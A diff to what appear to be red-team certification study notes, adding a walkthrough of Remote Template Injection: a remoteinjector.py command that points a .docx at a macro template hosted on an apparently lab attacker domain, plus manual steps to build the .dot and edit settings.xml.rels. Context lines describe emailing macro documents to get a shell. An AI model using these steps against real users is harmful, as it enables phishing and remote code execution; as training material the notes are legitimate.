@@ -305,3 +305,22 @@ Go to `Site Management` > `Host File` you will see your powershell payload hoste
 4. send an email and attach your Word document. open the document and enable macros, then you will get a shell
 
 ![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/99f340ed-fdf7-4008-a4d0-63dfa0ae613a)
+
+### Remote Template Injection
+Microsoft Word has the option of creating new documents from a template.  Office has some templates pre-installed, you can make custom templates, and even download new ones.  Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.
+
+- Automation
+[Remoteinjector](https://github.com/JohnWoodman/remoteinjector) is a python tool that can automate this process so that you don't have to modify the XML manually.
+```
+ubuntu@DESKTOP-3BSK7NO ~> python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
+URL Injected and saved to /mnt/c/Payloads/document_new.docx
+```
+- Manual
+1. Open Word on the Attacker Desktop, create a new blank document and insert your desired macro.  Save this to C:\Payloads as a Word 97-2003 Template (*.dot) file.  This is now our "malicious remote template".  Use Cobalt Strike to host this file at http://nickelviper.com/template.dot.
+
+2. create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`.  Add any content you want, then save it to `C:\Payloads` as a new .docx.  Browse to the directory in explorer, right-click and select `7-Zip` > `Open archive`.  Navigate to `word` > `_rels`, right-click on `settings.xml.rels` and select Edit.
+
+This is just a small XML file.  Scroll right until you see the Target entry.
+
+It's currently pointing to the template on our local disk from which the document was created.  Simply modify this so it points to the template URL instead.
+
